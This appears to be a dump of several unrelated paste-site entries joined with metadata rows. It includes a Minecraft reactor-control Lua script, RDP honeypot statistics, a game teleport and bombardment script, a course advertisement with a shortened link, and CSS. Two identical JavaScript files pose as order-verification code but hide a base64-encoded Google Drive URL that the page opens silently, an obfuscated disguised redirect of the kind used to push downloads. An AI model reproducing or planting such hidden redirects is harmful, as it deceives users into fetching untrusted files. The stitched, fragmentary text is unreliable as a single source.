    local convLVL       = (tonumber(info.fuelConversion) / tonumber(info.maxFuelConversion) * 1.3) - 0.3
	
 -- Calculate the temperature rise resistance for the reactor at the desired temperature.
 
    local targetTempResist = ((targetTemp50^4.0) / (100.0 - targetTemp50))
	
 -- Calculate the temperature rise exponential needed to reach the desired temperature
 
    local targetTempExpo = -(targetTempResist*convLVL) - 1000.0*convLVL + targetTempResist
	
 -- Calculate the saturation level needed to produce the required tempRiseExpo
 
    local term1 = 1334.1-(3.0*targetTempExpo)
    local term2 = (1200690.0-(2700.0*targetTempExpo))^2.0
    local term3 = ((-1350.0*targetTempExpo)+(((-4.0*term1^3.0+term2)^(1.0/2.0))/2.0)+600345.0)^(1.0/3.0)
    local targetNegCSat = -(term1/(3.0*term3))-(term3/3.0)
	
 -- Saturation received from above equation needs to be reformatted to a more useful form
 
    local targetCoreSat = 1.0 - (targetNegCSat/99.0)
    local targetSat = targetCoreSat * tonumber(info.maxEnergySaturation)
	
 -- Calculate the difference between where saturation is and where it needs to be
 
    local saturationError = tonumber(info.energySaturation) - targetSat
	
 -- Calculate field drain
 
    local tempDrainFactor = 0.0
    if tonumber(info.temperature) > 8000.0 then
		tempDrainFactor = 1.0 + ((tonumber(info.temperature)-8000.0)^2.0 * 0.0000025)
    elseif tonumber(info.temperature) > 2000.0 then
		tempDrainFactor = 1.0
    elseif tonumber(info.temperature) > 1000.0 then
		tempDrainFactor = (tonumber(info.temperature)-1000.0)/1000.0
    end
    local baseMaxRFt = (tonumber(info.maxEnergySaturation) / 1000.0) * tonumber(reactorOutputMultiplier) * 1.5
    local fieldDrain = math.min(tempDrainFactor * math.max(0.01, (1.0-coreSat)) * (baseMaxRFt / 10.923556), 2147000000.0)
    local fieldNegPercent = 1.0 - targetShield
	
 --local fieldInputRate = fieldDrain / fieldNegPercent
 
    local fieldStrengthError = (tonumber(info.maxFieldStrength) * targetShield) - tonumber(info.fieldStrength)
    local requiredInput = math.min((tonumber(info.maxFieldStrength) * tonumber(info.fieldDrainRate)) / (tonumber(info.maxFieldStrength) - tonumber(info.fieldStrength)), tonumber(info.maxFieldStrength) - tonumber(info.fieldStrength))
	
 --Automations
 
	if info.status == ""running"" then
    local outputNeeded = math.min(saturationError, (tonumber(info.maxEnergySaturation)/40))-- + info.generationRate
		outputFlux.setFlowOverride(outputNeeded)
		inputFlux.setFlowOverride(math.min(fieldStrengthError + requiredInput, tonumber(info.maxFieldStrength)) - tonumber(info.fieldDrainRate) + 1)
    elseif info.status == ""warming_up"" then
		outputFlux.setFlowOverride(0.0)
		inputFlux.setFlowOverride(550000000.0)
    elseif info.status == ""stopping"" then
		outputFlux.setFlowOverride(0.0)
		inputFlux.setFlowOverride(requiredInput)
    if info.temperature > cutoffTemp then
        print(""Reactor Too Hot, shutting down"")
        reactor.stopReactor()
    end
    if ((info.fieldStrength / info.maxFieldStrength) * 100) < cutoffField then
        print(""Reactor Field Has Failed, Failsafe Activated, Shutting Down"")
        reactor.stopReactor()
    end
    if ((1 - info.fuelConversion / info.maxFuelConversion) * 100) < 0.2 then
        print(""Reactor Fuel Low, Shutting Down"")
		reactor.stopReactor()
    end
   end

	-- Get Temp Rise
		oldTemp = currentTemp or info.temperature
		currentTemp = info.temperature
		oldTempRate = tempChangeRate or currentTemp - oldTemp
		tempChangeRate = currentTemp - oldTemp
		tempAccel = tempChangeRate - oldTempRate
	if tempAccel == 0 then
		tempAccel = 0.001
	end
	-- Get Fuel Use Rate
		oldFuel = currentFuel or (info.maxFuelConversion - info.fuelConversion)
		currentFuel = (info.maxFuelConversion - info.fuelConversion)
		oldUseRate = fuelUseRate or math.max(info.fuelConversionRate*20, 0.1)
		fuelUseRate = math.max(info.fuelConversionRate*20, 0.1)
		fuelAccel = math.max(fuelUseRate - oldUseRate, 0.1)
 -- Fuel Conversion Rate
	if info.fuelConversionRate > 249999 then
		fuelConversionRate = ((info.fuelConversionRate / (info.maxFuelConversion * 1000000)) * 2000)
		fuelMeasure = ""  %%/s""
	elseif info.fuelConversionRate > 999 then
		fuelConversionRate = (info.fuelConversionRate / 1000)
		fuelMeasure = "" ""..(unicode.char(956))..""b/t""
	elseif info.fuelConversionRate > 999999 then
		fuelConversionRate = (info.fuelConversionRate / 1000000)
		fuelMeasure = "" mb/t""
	else
		fuelConversionRate = info.fuelConversionRate
		fuelMeasure = "" nb/t""
	end
 -- Get Time Until Cool
	if info.fuelConversionRate < 1 then
		tempDrain = ((info.temperature - 2000) / 0.4)
	else
		tempDrain = 1
	end
 -- Get Temp Rise
	
	
 --Burn Stage
	if ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 20 then burnStage = ""H""
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 15 then burnStage = ""He""
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 10 then burnStage = ""C""
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 8 then burnStage = ""Ne""
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 5.5 then burnStage = ""O""
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 2.5 then burnStage = ""Si""
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 1 then burnStage = ""Fe""
	end
 -- Accuracy
	if ((info.fieldStrength / info.maxFieldStrength) * 100) > idealField then
	 deviation = (((info.fieldStrength / info.maxFieldStrength) * 100) + fieldAdj) - idealField
	elseif ((info.fieldStrength / info.maxFieldStrength) * 100) < idealField then
	 deviation = idealField - (((info.fieldStrength / info.maxFieldStrength) * 100) + fieldAdj)
	end
 -- DrawData
	local secondsToExpire = (info.maxFuelConversion - info.fuelConversion) / math.max(info.fuelConversionRate*0.00002, 0.00001)
 -- GUI
	if term.isAvailable() and Mode ~= 3 then
		function modify_eff(offset)
			local eff = ((outputFlux / inputFlux) * 100)
			if eff > 100000 then
			eff = 1
		end
	end
    local left_margin = 2
    local spacing = 1
    local values = {
			    ""Draconic Control™  [v14.0 sMAT | YZK9hTBU]"",
                "" "",
                ""┌──────────────────Reactor Statistics────────────────────┐"",
string.format(""│Time Until Refuel:         │  %5.0fd, %2.0fh, %2.0fm, %2.0fs     │"", secondsToExpire/86400, secondsToExpire	/3600 % 24, secondsToExpire/60 % 60, secondsToExpire % 60),
string.format(""│Time Until Cool:           │  %5.0fd, %2.0fh, %2.0fm, %2.0fs     │"", tempDrain/86400, tempDrain	/3600 % 24, tempDrain/60 % 60, tempDrain % 60),
string.format(""│Ideal Field:               │           %8.3f%%        │"", idealField),
string.format(""│Current Field:             │           %7.3f%%         │"", ((info.fieldStrength / info.maxFieldStrength) * 100) + fieldAdj),
                ""├───────────────────────────┼────────────────────────────┤"",
string.format(""│Fuel Remaining:            │           %7.3f%%         │"", ((1 - info.fuelConversion / info.maxFuelConversion) * 100)),
string.format(""│Fuel Use Rate:             │           %7.3f"" .. fuelMeasure .. ""     │"", fuelConversionRate),
                ""├───────────────────────────┼────────────────────────────┤"",
string.format(""│Temperature                │   %7.1f°c [%8.1f°f]   │"", info.temperature, ((info.temperature * 1.8) + 32)),
string.format(""│Ideal Temperature:         │   %7.1f°c [%8.1f°f]   │"", idealTemp, ((idealTemp * 1.8) + 32)),
                ""├───────────────────────────┼────────────────────────────┤"",
string.format(""│Energy Input:              │   %12.1f RF/t        │"", requiredInput),
string.format(""│Energy Output:             │   %12.1f RF/t        │"", outputFlux.getFlow()),
                ""└───────────────────────────┴────────────────────────────┘"",
                "" "" .. cVar,
                "" ""
}
	local values2 = {
"" "",
"" "",
"" "",
""                                                                                                                          [Reference Table]"",
""                                                                                                             ┌─────────────┬─────────────┬─────────────┐"",
""                                                                                                             │ Temperature │  Remaining  │ Consumption │"",
""                                                                                                             ├─────────────┼─────────────┼─────────────┤"",
""                                                                                                             │    14000    │    93.27    │    91.90    │"",
""                                                                                                             ├─────────────┼─────────────┼─────────────┤"",
""                                                                                                             │    15000    │    59.00    │    123.5    │"",
""                                                                                                             ├─────────────┼─────────────┼─────────────┤"",
""                                                                                                             │    16000    │    36.45    │     161     │"",
""                                                                                                             ├─────────────┼─────────────┼─────────────┤"",
""                                                                                                             │    17000    │    21.40    │     204     │"",
""                                                                                                             ├─────────────┼─────────────┼─────────────┤"",
""                                                                                                             │    18000    │    11.80    │     251     │"",
""                                                                                                             ├─────────────┼─────────────┼─────────────┤"",
""                                                                                                             │    19000    │    03.89    │     303     │"",
""                                                                                                             └─────────────┴─────────────┴─────────────┘"",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
			  ""Eq. Fusion Stage     "" .. burnStage,
string.format(""Max Fuel [nb]:       %4.3f"", (info.maxFuelConversion * 1000000)),
string.format(""Fuel Remaining [nb]: %4.3f"", ((info.maxFuelConversion - info.fuelConversion) * 1000000)),
string.format(""Temperature Rise: %4.3f"", tempAccel),
string.format(""Temp Resist for target temp %g (%g): %.2f"", idealTemp, targetTemp50, targetTempResist),
string.format(""Temp expo for convLVL %.2f: %.2f"", convLVL, targetTempExpo),
string.format(""Saturation needed for zero rise: %g (%3.2f%%)"", targetSat, targetCoreSat*100),
string.format(""Error between current saturation and target saturation: %g\n"", saturationError),
string.format(""Current field drain is %g RF/t"", info.fieldDrainRate),
string.format(""Current temp drain factor for temp %g is %1.2f"", info.temperature, tempDrainFactor),
string.format(""fieldNegPercent is %g"", fieldNegPercent),
string.format(""Required input to counter field drain: %g RF/t\n"", requiredInput),
string.format(""Field Deviation: "" .. unicode.char(8776) .. deviation .. ""%%""),
string.format(""Field #:       %9.3f"", info.fieldStrength),
string.format(""Field Per:     %9.3f"", ((info.fieldStrength / info.maxFieldStrength) * 100)),
string.format(""Input Flux Gate:  ["" .. inputFlux.address .. ""] Set To: "" .. inputFlux.getFlow()),
string.format(""Output Flux Gate: ["" .. outputFlux.address .. ""] Set To: "" .. outputFlux.getFlow())
}
term.clear()
    if Mode == 2 and Mode ~= 3 then
	for i, v in ipairs(values2) do
		term.setCursor(left_margin, i * spacing)
		term.write(v)
		end
	end
	if Mode ~= 3 then
	for i, v in ipairs(values) do
		term.setCursor(left_margin, i * spacing)
		term.write(v)
		end
	end
 -- Draw Buttons
 
		term.setCursor(tempOffsetX, tempOffsetY+10)
		term.write(""Reactor Temperature"")
		term.setCursor(fieldOffsetX+1, fieldOffsetY+10)
		term.write(""  Field Strength"")
		gpu.setForeground(0xFFFFFF)
	for bname, button in pairs(buttons) do
		gpu.setForeground(0x000000)
		if button.depressed then
			button.depressed = button.depressed - 1
			if button.depressed == 0 then
				button.depressed = nil
			end
		end
	if button.condition == nil or button.condition() then
		local centerColor = 0xBBBBBB
		local highlightColor = 0xCCCCCC
		local lowlightColor = 0x808080
	if button.depressed then
		centerColor = 0xAAAAAA
		highlightColor = 0x707070
		lowlightColor = 0xBBBBBB
	end
		gpu.setBackground(centerColor)
        gpu.fill(button.x, button.y, button.width, button.height, "" "")
	if button.width > 1 and button.height > 1 then
		gpu.setBackground(lowlightColor)
		gpu.fill(button.x+1, button.y+button.height-1, button.width-1, 1, "" "")
		gpu.fill(button.x+button.width-1, button.y, 1, button.height, "" "")
		gpu.setBackground(highlightColor)
		gpu.fill(button.x, button.y, 1, button.height, "" "")
		gpu.fill(button.x, button.y, button.width, 1, "" "")
	end
        gpu.setBackground(centerColor)
	if button.textcolor then gpu.setForeground(button.textcolor) end
        term.setCursor(button.x + math.floor(button.width / 2 - #button.text / 2), button.y + math.floor(button.height / 2))
        term.write(button.text)
	end
    end
    gpu.setBackground(0x676767)
    gpu.setForeground(0x220000)
	end
	if term.isAvailable() and Mode == 3 then
	local left_margin = 2
    local spacing = 1
	local values3 = {
""Eq. Fusion Stage     "" .. burnStage,
string.format(""Max Fuel [nb]:       %4.3f"", (info.maxFuelConversion * 1000000)),
string.format(""Fuel Remaining [nb]: %4.3f"", ((info.maxFuelConversion - info.fuelConversion) * 1000000)),
string.format(""Temperature Rise: %4.3f"", tempAccel),
string.format(""Temp Resist for target temp %g (%g): %.2f"", idealTemp, targetTemp50, targetTempResist),
string.format(""Temp expo for convLVL %.2f: %.2f"", convLVL, targetTempExpo),
string.format(""Saturation needed for zero rise: %g (%3.2f%%)"", targetSat, targetCoreSat*100),
string.format(""Error between current saturation and target saturation: %g\n"", saturationError),
string.format(""Current field drain is %g RF/t"", info.fieldDrainRate),
string.format(""Current temp drain factor for temp %g is %1.2f"", info.temperature, tempDrainFactor),
string.format(""fieldNegPercent is %g"", fieldNegPercent),
string.format(""Required input to counter field drain: %g RF/t\n"", requiredInput),
string.format(""Field Deviation: "" .. unicode.char(8776) .. deviation .. ""%%""),
string.format(""Input Flux Gate:  ["" .. inputFlux.address .. ""] Set To: "" .. inputFlux.getFlow()),
string.format(""Output Flux Gate: ["" .. outputFlux.address .. ""] Set To: "" .. outputFlux.getFlow())
}
 for i, v in ipairs(values3) do
 term.setCursor(left_margin, i * spacing)
 term.write(v)
 end
end
 -- Wait for next tick, or manual shutdown
	local event, id, op1, op2 = event.pull(0.05)
	if event == ""interrupted"" then
		if safe then
		break
		end
	elseif event == ""touch"" then
 -- Handle Button Presses
		local x = op1
		local y = op2
		for bname, button in pairs(buttons) do
			if (button.condition == nil or button.condition()) and x >= button.x and x <= button.x + button.width and y >= button.y and y <= button.y + button.height then
				button.action()
				button.depressed = 3
			end
		end
	end
	os.sleep()
		if info.fuelConversionRate == 0 and chaosMode == 1 then
		reactor.stopReactor()
		cutoffTemp = 9001
		idealTemp = 8000
		chaosMode = 0
    end
end
:: fin ::"
4zDUmpaL,2025-04-02_stats.json,rdp_snitch,JSON,Thursday 3rd of April 2025 07:15:18 PM CDT,"{
  ""ip"": {
    ""156.146.57.174"": 8983,
    ""156.146.57.120"": 3039,
    ""138.199.24.6"": 65886,
    ""156.146.57.110"": 35907,
    ""150.95.89.149"": 8811,
    ""156.146.57.52"": 8979,
    ""106.14.144.233"": 429,
    ""146.190.105.191"": 2148,
    ""191.96.106.68"": 9612,
    ""199.45.155.90"": 3,
    ""194.187.176.9"": 3,
    ""185.7.214.81"": 15,
    ""205.210.31.38"": 9,
    ""167.94.138.184"": 3,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""91.238.181.93"": 6,
    ""188.166.250.11"": 6,
    ""91.238.181.94"": 6,
    ""119.40.84.186"": 3,
    ""147.182.229.114"": 750,
    ""138.199.24.8"": 9,
    ""185.147.124.165"": 9,
    ""92.255.57.86"": 6,
    ""178.63.252.130"": 3,
    ""185.103.103.248"": 3,
    ""205.210.31.23"": 9,
    ""157.245.104.150"": 15,
    ""92.255.85.59"": 12,
    ""185.42.12.5"": 18,
    ""157.245.156.139"": 6,
    ""206.168.34.56"": 3,
    ""198.235.24.107"": 9,
    ""138.199.24.30"": 2082,
    ""152.32.181.210"": 3,
    ""61.219.85.85"": 3,
    ""193.29.13.50"": 9,
    ""103.182.19.34"": 6,
    ""194.165.16.166"": 6,
    ""198.235.24.235"": 9,
    ""194.165.16.165"": 6,
    ""45.135.232.124"": 9,
    ""206.168.34.74"": 3
  },
  ""asn"": {
    ""AS212238"": 56908,
    ""AS60068"": 67977,
    ""AS135161"": 8811,
    ""AS37963"": 429,
    ""AS14061"": 2925,
    ""AS174"": 9612,
    ""AS398722"": 3,
    ""AS208843"": 3,
    ""AS207566"": 33,
    ""AS396982"": 36,
    ""AS398324"": 9,
    ""AS208046"": 9,
    ""AS213438"": 9,
    ""AS49434"": 12,
    ""AS24122"": 3,
    ""AS49505"": 9,
    ""AS24940"": 3,
    ""AS215590"": 3,
    ""AS59425"": 18,
    ""AS135377"": 3,
    ""AS3462"": 3,
    ""AS42397"": 9,
    ""AS63737"": 6,
    ""AS48721"": 12,
    ""AS198953"": 9
  },
  ""isp"": {
    ""Datacamp Limited"": 56908,
    ""DataCamp Limited"": 67977,
    ""GMO-Z.COM PTE. LTD."": 8811,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""DigitalOcean, LLC"": 2925,
    ""Cogent Communications"": 9612,
    ""Censys, Inc."": 12,
    ""Alpha Strike Labs GmbH"": 3,
    ""Chang Way Technologies Co. Limited"": 51,
    ""Google LLC"": 36,
    ""ColocationX Ltd."": 9,
    ""ColocaTel Inc."": 9,
    ""Datacenter location PAR1 France"": 12,
    ""BDCOM Online Limited"": 3,
    ""JSC Selectel"": 9,
    ""Hetzner Online GmbH"": 3,
    ""DpkgSoft International Limited"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""Bunea TELECOM SRL"": 9,
    ""TINHVAN"": 6,
    ""Flyservers S.A."": 12,
    ""Proton66 OOO"": 9
  },
  ""org"": {
    ""Datacamp Limited"": 56908,
    ""Cdn77 SGP"": 67977,
    ""Zcom Thai"": 8811,
    ""Aliyun Computing Co., LTD"": 429,
    ""DigitalOcean, LLC"": 2919,
    ""Ipxo"": 9612,
    ""Censys, Inc."": 9,
    ""Alpha Strike Labs GmbH"": 3,
    ""Chang Way Technologies Co. Limited"": 33,
    ""Palo Alto Networks, Inc"": 36,
    ""Censys, Inc"": 3,
    ""ColocationX Ltd"": 9,
    ""ColocaTel Inc"": 9,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Digitalocean"": 6,
    ""BDCOM Online Limited"": 3,
    ""Almira LLC"": 9,
    ""Rasoul Shamaei"": 3,
    ""DpkgSoft International Limited"": 3,
    ""Horizon LLC"": 18,
    ""Ucloud Information Technology"": 3,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""Bunea TELECOM SRL"": 9,
    ""Tinh VAN Network Solutions Company Limited"": 6,
    ""Flyservers S.A"": 12,
    ""Proton66 LLC"": 9
  },
  ""regionName"": {
    ""North West"": 124885,
    ""Tokyo"": 8811,
    ""Shanghai"": 429,
    ""South West"": 2160,
    ""California"": 10398,
    ""Kowloon"": 3,
    ""Land Berlin"": 3,
    ""Moscow"": 69,
    ""Michigan"": 3,
    ""Virginia"": 9,
    ""North Holland"": 9,
    ""\u00cele-de-France"": 12,
    ""Dhaka Division"": 3,
    ""Saxony"": 3,
    ""Stockholm County"": 3,
    ""Karnataka"": 15,
    ""Illinois"": 6,
    ""Dubai"": 3,
    ""New Taipei City"": 3,
    ""Timi\u0219 County"": 9,
    ""Hanoi"": 6,
    ""Kaunas"": 12
  },
  ""country"": {
    ""Singapore"": 127045,
    ""Japan"": 8811,
    ""China"": 429,
    ""United States"": 10416,
    ""Hong Kong"": 3,
    ""Germany"": 6,
    ""Russia"": 69,
    ""The Netherlands"": 9,
    ""France"": 12,
    ""Bangladesh"": 3,
    ""Sweden"": 3,
    ""India"": 15,
    ""United Arab Emirates"": 3,
    ""Taiwan"": 3,
    ""Romania"": 9,
    ""Vietnam"": 6,
    ""Lithuania"": 12
  },
  ""account"": {
    ""hello"": 146680,
    ""(empty)"": 12,
    ""user"": 3,
    ""Administr"": 42,
    ""pibaSXQDS"": 3,
    ""OVfIvN"": 3,
    ""ATsCFL"": 3,
    ""Domain"": 42,
    ""Test"": 36,
    ""YAmReehCP"": 3,
    ""ZQpUAz"": 3,
    ""ccFSxr"": 3,
    ""kSOWaRlbv"": 3,
    ""JUOHjP"": 3,
    ""HLJQlz"": 3,
    ""Administrator"": 3,
    ""jatUOeHuV"": 3,
    ""JNqsty"": 3,
    ""rrEtmJ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 146854
  },
  ""client_build"": {
    ""Unknown"": 146854
  },
  ""client_name"": {
    ""Unknown"": 146854
  },
  ""ip_type"": {
    ""hosting & proxy"": 128233,
    ""hosting"": 8880,
    ""proxy"": 9663,
    ""Unknown"": 78
  }
}"
kPa8mRDw,Order.js,rodrigomaise99,JavaScript,Thursday 3rd of April 2025 07:03:40 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/895/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
j9Gk2DhR,Main Controller,Alexr360,Lua,Thursday 3rd of April 2025 06:37:11 PM CDT,"-- Combined Teleport and Artillery Control System
local modem = peripheral.find(""modem"") or error(""No modem attached"", 0)
local CHANNEL = 15
modem.open(CHANNEL)

-- Function to wait for a modem message on a specific channel
local function receiveMessage()
    local event, _, channel, _, message = os.pullEvent(""modem_message"")
    if channel == CHANNEL then
        return message
    else
        return receiveMessage()
    end
end

-- Function to summon particles at a given position
local function summonParticles(x, y, z)
    for _ = 1, 10 do
        commands.exec(""particle minecraft:portal "" .. x .. "" "" .. y .. "" "" .. z .. "" 1 1 1 0.1 50"")
        sleep(0.1) -- Creates a brief delay between particle bursts
    end
end

-- Function to add slight randomness to coordinates
local function addRandomness(coordinate)
    -- Generate random number between -2 and 2
    local randomOffset = math.random(-2, 2)
    
    -- 60% chance to apply randomness (accuracy simulation)
    if math.random(1, 10) <= 6 then
        return coordinate + randomOffset
    end
    
    return coordinate
end

-- Function to summon TNT in a grid with offset for alternating patterns
local function summonGrid(size, spacing, targetX, targetY, targetZ, projectileType, iteration)
    local offset = math.floor(size / 2) * spacing
    local patternOffset = (iteration % 2) * (spacing / 2) -- Alternate pattern offset
    
    for dx = -offset, offset, spacing do
        for dz = -offset, offset, spacing do
            -- Apply alternating offset to create staggered pattern
            local x = targetX + dx + patternOffset
            local z = targetZ + dz + patternOffset
            
            -- Add randomness to each explosion
            local randomX = addRandomness(x)
            local randomY = addRandomness(targetY)
            local randomZ = addRandomness(z)
            
            commands.exec((""summon %s %d %d %d {Fuse:100}""):format(projectileType, randomX, randomY, randomZ))
        end
    end
end

-- Seed the random number generator
math.randomseed(os.time())

term.clear()
term.setCursorPos(1, 1)
print(""Bastion Network Online!"")
print(""Waiting for command..."")

-- Main program loop
while true do
    local command = receiveMessage()
    
    if command == ""Recall"" then
        print(""Recalling Player..."")
        modem.transmit(43, CHANNEL, ""Recalling Player..."")

        print(""Starting Teleporter"")
        os.sleep(2)

        for i = 1, 100 do
            local chargePercent = i
            print(""Charging "" .. chargePercent .. ""%"")
            modem.transmit(43, CHANNEL, ""Charging "" .. chargePercent .. ""%"")
            sleep(0.05) -- 100 updates over 5 seconds
        end

        -- Teleport the player
        local targetX, targetY, targetZ = 293, 95, 750
        commands.exec(""tp Alexr036 "" .. targetX .. "" "" .. targetY .. "" "" .. targetZ)

        -- Summon teleport particles
        summonParticles(targetX, targetY, targetZ)
        
    elseif command == ""Teleport"" then
        print(""Programming Started"")

        local positionX = receiveMessage()
        print(""Position X: "" .. positionX)

        local positionY = receiveMessage()
        print(""Position Y: "" .. positionY)

        local positionZ = receiveMessage()
        print(""Position Z: "" .. positionZ)
        
        print(""Starting Teleporter"")
        os.sleep(2)

        for i = 1, 100 do
            local chargePercent = i
            print(""Charging "" .. chargePercent .. ""%"")
            modem.transmit(43, CHANNEL, ""Charging "" .. chargePercent .. ""%"")
            sleep(0.05) -- 100 updates over 5 seconds
        end

        -- Teleport the player
        commands.exec(""tp Alexr036 "" .. positionX .. "" "" .. positionY .. "" "" .. positionZ)

        -- Summon teleport particles
        summonParticles(positionX, positionY, positionZ)
        
    elseif command == ""TNT"" or command == ""Nuke"" then
        print(""Artillery System Online"")
        modem.transmit(43, CHANNEL, ""Artillery System Online"")
        
        -- Store the projectile type from the command
        local projectileType = command
        print(""Projectile Type: "" .. projectileType)
            
        local projectilePattern = receiveMessage()
        print(""Projectile Pattern: "" .. projectilePattern)

        local iterations = receiveMessage() + 0
        print(""Iterations: "" .. iterations)

        local targetX = receiveMessage()
        print(""Target X: "" .. targetX)

        local targetY = receiveMessage() + 40
        print(""Target Y: "" .. targetY)

        local targetZ = receiveMessage()
        print(""Target Z: "" .. targetZ)

        -- Item Based on Type
        local spread = 0
        if projectileType == ""TNT"" then
            projectileType = ""minecraft:tnt""
            spread = 7
        elseif projectileType == ""Nuke"" then
            projectileType = ""alexscaves:nuclear_bomb""
            spread = 80
        end

        modem.transmit(43, CHANNEL, ""Bombardment Started"")

        -- Pattern Based on input with alternating offsets and randomness
        for i = 1, tonumber(iterations) do
            print(""Firing iteration "" .. i)
            modem.transmit(43, CHANNEL, ""Firing iteration "" .. i)

            -- Add slight variation to Y position for each iteration
            local variationY = (i % 3) * 2 -- Varies height by 0, 2, 4 blocks
            local iterationY = targetY + variationY
            
            if projectilePattern == ""Single"" then
                -- For single pattern, create slight x/z offsets for each iteration
                local offsetX = (i % 3 - 1) * (spread / 3)
                local offsetZ = ((i + 1) % 3 - 1) * (spread / 3)
                
                -- Add randomness to coordinates
                local randomX = addRandomness(targetX + offsetX)
                local randomY = addRandomness(iterationY)
                local randomZ = addRandomness(targetZ + offsetZ)
                
                commands.exec((""summon %s %d %d %d {Fuse:100}""):format(
                    projectileType, 
                    randomX, 
                    randomY, 
                    randomZ
                ))
            elseif projectilePattern == ""2x2"" then
                summonGrid(2, spread, targetX, iterationY, targetZ, projectileType, i)
            elseif projectilePattern == ""3x3"" then
                summonGrid(3, spread, targetX, iterationY, targetZ, projectileType, i)
            elseif projectilePattern == ""4x4"" then
                summonGrid(4, spread, targetX, iterationY, targetZ, projectileType, i)
            elseif projectilePattern == ""5x5"" then
                summonGrid(5, spread, targetX, iterationY, targetZ, projectileType, i)
            end
            
            os.sleep(5)
        end

        -- Acknowledge firing
        modem.transmit(43, CHANNEL, ""Bombardment Complete"")
        
    elseif command == ""Remote Connected"" then
        print(""Connected to System"")
        modem.transmit(43, CHANNEL, ""Connected to System"")
    else
        print(""Unknown command: "" .. command)
        modem.transmit(43, CHANNEL, ""Unknown command"")
    end
    
    print(""Waiting for next command..."")
end"
Wkv6juYY,Products.js,rodrigomaise99,JavaScript,Thursday 3rd of April 2025 06:17:31 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/389/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pC98mvq0,Interactivity with JavaScript: The Ultimate Beginner's Guide,f0f077,JavaScript,Thursday 3rd of April 2025 05:38:55 PM CDT,"Interactivity with JavaScript: The Ultimate Beginner's Guide
Bring Websites to Life with Dynamic JavaScript Programming
🚀 Master JavaScript from scratch and create engaging, interactive web experiences—the essential skill for modern web developers!

🔥 What You’ll Learn
✔ JavaScript Fundamentals – Variables, functions, loops, and DOM manipulation
✔ Event Handling – Clicks, forms, keyboard inputs, and user interactions
✔ Dynamic Web Pages – Modify content, styles, and animations in real-time
✔ Async JavaScript – Callbacks, promises, and fetch API for data loading
✔ Mini Projects – Build image sliders, quizzes, todo apps, and games
✔ Debugging & Best Practices – Write clean, efficient code

💡 Why Learn JavaScript?
✅ #1 Web Language – Runs on every browser (Chrome, Firefox, Safari)
✅ Frontend Frameworks – Foundation for React, Vue, and Angular
✅ Backend Potential – Use with Node.js for full-stack development
✅ High Demand – Jobs in web dev, startups, and tech giants

🛠 Skills & Tools Covered
Modern ES6+ Syntax (Arrow functions, template literals, destructuring)

Chrome DevTools Debugging

Interactive UI/UX Techniques

API Integration (JSON, AJAX)

🎁 Bonus Content
📂 Downloadable Code Snippets & Cheat Sheets
🔄 Real-World Practice Exercises
🚀 Deployment Guide (GitHub Pages, Netlify)

🚀 Start Building Interactive Websites Today!
🔗 Free Intro Lesson → (https://cuty.io/mrIHQCjCkJVX)"
icRN98AF,Kaching test task2,talalaite,CSS,Thursday 3rd of April 2025 05:15:07 PM CDT,".kaching-bundles .kaching-bundles__bar-main {
    display: flex;
    align-items: center;
    gap: 18px;
    min-height: 55px;
    margin-top: 12px;
}

.kaching-bundles .kaching-bundles__bar-most-popular__content {
    margin: 0 8px;
    padding: 6px 46px;
    border-bottom-left-radius: 5px;
    border-bottom-right-radius: 5px;
    font-family: sans-serif;
    font-size: 12px;
    font-weight: 700;
    line-height: 1;
    color: var(--bar-most-popular-color, #fff);
    background-color: var(--bar-most-popular-background-color);
}

